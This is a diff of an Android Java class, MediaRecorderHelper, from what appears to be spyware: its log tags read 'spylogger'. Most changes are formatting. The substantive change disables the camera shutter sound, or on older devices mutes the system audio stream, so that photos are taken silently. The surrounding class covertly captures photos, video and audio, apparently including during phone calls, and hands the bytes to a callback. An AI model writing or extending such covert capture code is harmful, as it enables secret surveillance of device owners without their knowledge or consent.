@@ -4,6 +4,7 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
+import android.media.AudioManager;
 import android.media.CamcorderProfile;
 import android.media.MediaRecorder;
 import android.os.AsyncTask;
@@ -29,7 +30,7 @@ import lombok.Setter;
 
 @Getter
 @Setter
-public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRecorder.OnErrorListener, SurfaceHolder.Callback, Camera.PictureCallback {
+public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener, SurfaceHolder.Callback, Camera.PictureCallback {
 
     public final int MEDIA_TYPE_IMAGE = 1;
     public final int MEDIA_TYPE_VIDEO = 2;
@@ -53,19 +54,19 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     private WindowManager wm;
     private TipoRecordedMidia tipoMidia;
     private byte[] fileBytes;
-    private int tentativas=0;
+    private int tentativas = 0;
 
-    public enum TipoRecordedMidia{
-        AUDIO,VIDEO,IMAGE;
+    public enum TipoRecordedMidia {
+        AUDIO, VIDEO, IMAGE;
     }
 
     public MediaRecorderHelper(Context context, TipoRecordedMidia tipoRecordedMidia) throws IOException {
         this.context = context;
-        this.tipoMidia=tipoRecordedMidia;
+        this.tipoMidia = tipoRecordedMidia;
     }
 
     private void prepareAudio() throws IOException {
-        recordedFile =  getOutputMediaFile(MEDIA_TYPE_AUDIO); //File.createTempFile("record", ".mp4", context.getCacheDir());
+        recordedFile = getOutputMediaFile(MEDIA_TYPE_AUDIO); //File.createTempFile("record", ".mp4", context.getCacheDir());
 
         if (ligacao) {
             try {
@@ -161,17 +162,17 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         }
     }
 
-    public void takePicture(){
+    public void takePicture() {
 
-        if(TipoRecordedMidia.IMAGE==tipoMidia) {
+        if (TipoRecordedMidia.IMAGE == tipoMidia) {
             startCommand = true;
 
-            if(mCamera==null){
+            if (mCamera == null) {
                 prepareSurface();
             }
 
             if (isPreviewing) {
-                Log.d("spylogger - ini: ",new Date().toString());
+                Log.d("spylogger - ini: ", new Date().toString());
                 new AsyncTask<Object, Object, Object>() {
                     @Override
                     protected Object doInBackground(Object... objects) {
@@ -179,9 +180,8 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
                             Thread.sleep(2000);
                         } catch (InterruptedException e) {
                         }
-                        Log.d("spylogger - fim: ",new Date().toString());
-                        inicio=new Date();
-                        mCamera.enableShutterSound(false);
+                        Log.d("spylogger - fim: ", new Date().toString());
+                        inicio = new Date();
                         mCamera.takePicture(null, null, MediaRecorderHelper.this);
                         return null;
                     }
@@ -191,15 +191,24 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     }
 
     private Camera getCamera() {
-        if(mCamera==null) {
-            mCamera=Camera.open(frontCamera ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
+        if (mCamera == null) {
+            mCamera = Camera.open(frontCamera ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
+        }
+        if (mCamera != null) {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                mCamera.enableShutterSound(false);
+
+            } else {
+                AudioManager audio = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+                audio.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
+            }
         }
         return mCamera;
     }
 
     private void releaseMediaRecorder() {
         if (recorder != null) {
-            if(isRecording()) {
+            if (isRecording()) {
                 recorder.stop();
             }
             recorder.reset();   // clear recorder configuration
@@ -207,19 +216,19 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
             recorder = null;
 //            mCamera.lock();           // lock camera for later use
         }
-        if (mCamera!=null) {
+        if (mCamera != null) {
             mCamera.stopPreview();
             mCamera.release();
             wm.removeView(preview);
         }
     }
 
-    private boolean isVideo(){
-        return TipoRecordedMidia.VIDEO==tipoMidia;
+    private boolean isVideo() {
+        return TipoRecordedMidia.VIDEO == tipoMidia;
     }
 
     public void start() throws IOException {
-        if(TipoRecordedMidia.IMAGE==tipoMidia){
+        if (TipoRecordedMidia.IMAGE == tipoMidia) {
             return;
         }
 
@@ -243,12 +252,12 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
                 inicio = new Date();
             } catch (Exception e) {
                 tentativas++;
-                if(tentativas<=3){
+                if (tentativas <= 3) {
                     releaseMediaRecorder();
-                    recorder=null;
+                    recorder = null;
                     start();
-                }else{
-                    tentativas=0;
+                } else {
+                    tentativas = 0;
                     stop();
                 }
                 e.printStackTrace();
@@ -271,16 +280,16 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         } catch (InterruptedException e) {
         }
         releaseMediaRecorder();
-        if(inicio!=null){
+        if (inicio != null) {
             duration = ((inicio.getTime() - (new Date()).getTime()) / 1000);
         }
         recording = false;
         isPreviewing = false;
         if (callback != null) {
-            if(recordedFile!=null) {
+            if (recordedFile != null) {
                 callback.onFinish(Utils.getBytesFromFile(recordedFile));
             }
-            if(fileBytes!=null){
+            if (fileBytes != null) {
                 callback.onFinish(fileBytes);
             }
         }
@@ -289,7 +298,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     @Override
     public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
         if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
-            recording=false;
+            recording = false;
             stop();
         }
     }
@@ -299,15 +308,15 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         try {
             mCamera.setPreviewDisplay(holder);
             mCamera.startPreview();
-            isPreviewing=true;
-            if(isVideo()) {
+            isPreviewing = true;
+            if (isVideo()) {
                 prepareVideo();
             }
-            if(startCommand){
-                if(isVideo()){
+            if (startCommand) {
+                if (isVideo()) {
                     start();
-                }else{
-                   takePicture();
+                } else {
+                    takePicture();
                 }
             }
         } catch (Exception e) {
@@ -351,7 +360,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     }
 
     private boolean checkCameraHardware(Context context) {
-        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
+        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
             // this device has a camera
             return true;
         } else {
@@ -360,7 +369,7 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         }
     }
 
-    private  File getOutputMediaFile(int type){
+    private File getOutputMediaFile(int type) {
         // To be safe, you should check that the SDCard is mounted
         // using Environment.getExternalStorageState() before doing this.
 
@@ -370,8 +379,8 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         // between applications and persist after your app has been uninstalled.
 
         // Create the storage directory if it does not exist
-        if (! mediaStorageDir.exists()){
-            if (! mediaStorageDir.mkdirs()){
+        if (!mediaStorageDir.exists()) {
+            if (!mediaStorageDir.mkdirs()) {
                 Log.d("MyCameraApp", "failed to create directory");
                 return null;
             }
@@ -380,15 +389,15 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         // Create a media file name
         String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
         File mediaFile;
-        if (type == MEDIA_TYPE_IMAGE){
+        if (type == MEDIA_TYPE_IMAGE) {
             mediaFile = new File(mediaStorageDir.getPath() + File.separator +
-                    "IMG_"+ timeStamp + ".jpg");
-        } else if(type == MEDIA_TYPE_VIDEO) {
+                    "IMG_" + timeStamp + ".jpg");
+        } else if (type == MEDIA_TYPE_VIDEO) {
             mediaFile = new File(mediaStorageDir.getPath() + File.separator +
-                    "VID_"+ timeStamp + ".mp4");
-        } else if(type == MEDIA_TYPE_AUDIO) {
+                    "VID_" + timeStamp + ".mp4");
+        } else if (type == MEDIA_TYPE_AUDIO) {
             mediaFile = new File(mediaStorageDir.getPath() + File.separator +
-                    "AUD_"+ timeStamp + ".mp4");
+                    "AUD_" + timeStamp + ".mp4");
         } else {
             return null;
         }
@@ -399,19 +408,19 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     @Override
     public void onError(MediaRecorder mediaRecorder, int what, int extra) {
         stop();
-        Log.d("SPYLOGGER", "Erro na gravacao de video: !!!!!!!!!!!!!!!!!!" );
+        Log.d("SPYLOGGER", "Erro na gravacao de video: !!!!!!!!!!!!!!!!!!");
 
     }
 
     @Override
     public void onPictureTaken(byte[] bytes, Camera camera) {
-        fileBytes=bytes;
+        fileBytes = bytes;
         stop();
-        Log.d("SPYLOGGER", "onPictureTake: !!!!!!!!!!!!!!!!!!" );
+        Log.d("SPYLOGGER", "onPictureTake: !!!!!!!!!!!!!!!!!!");
     }
 
-    public void setMaxDuration(int maxDuration){
-        this.maxDuration=maxDuration*1000;
+    public void setMaxDuration(int maxDuration) {
+        this.maxDuration = maxDuration * 1000;
     }
 
 }
